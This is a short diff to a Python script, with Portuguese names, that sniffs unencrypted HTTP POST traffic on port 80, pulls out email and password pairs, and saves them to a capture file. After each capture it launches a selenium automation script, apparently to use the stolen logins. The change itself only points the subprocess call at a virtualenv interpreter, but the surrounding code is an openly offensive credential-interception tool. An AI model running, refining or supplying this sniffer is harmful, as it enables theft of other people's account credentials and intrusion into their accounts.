@@ -4,6 +4,7 @@ from urllib.parse import unquote
 import subprocess
 
 ARQUIVO_SAIDA = "captura.txt"
+python_venv = "./.venv/bin/python"
 
 def salvar_credenciais(email, senha):
     try:
@@ -39,7 +40,7 @@ def processar(pacote):
 
                 # salva imediatamente no arquivo
                 salvar_credenciais(email, senha)
-                subprocess.run(["python", "selenium_automation.py"])
+                subprocess.run([python_venv, "selenium_automation.py"])
                 print("-----------------------------------------\n")
 
         except Exception:
@@ -47,3 +48,4 @@ def processar(pacote):
 
 print("[*] Sniffer ativo. Aguardando POSTs decodificados...")
 sniff(filter="tcp port 80", prn=processar, store=False)
+
